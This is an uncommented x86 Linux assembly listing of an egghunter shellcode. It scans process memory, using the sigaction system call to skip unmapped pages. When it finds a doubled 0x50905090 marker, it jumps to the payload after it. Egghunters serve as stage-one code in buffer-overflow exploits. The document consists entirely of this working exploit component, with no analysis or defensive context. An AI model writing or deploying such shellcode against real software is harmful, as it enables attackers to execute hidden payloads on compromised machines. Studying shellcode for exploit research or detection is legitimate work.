global _start

section .text

_start:
  or cx,0xfff

j1:
  inc ecx
  push byte +0x43
  pop eax
  int 0x80
  cmp al,0xf2
  jz _start
  mov eax,0x50905090
  mov edi,ecx
  scasd
  jnz j1
  scasd
  jnz j1
  jmp edi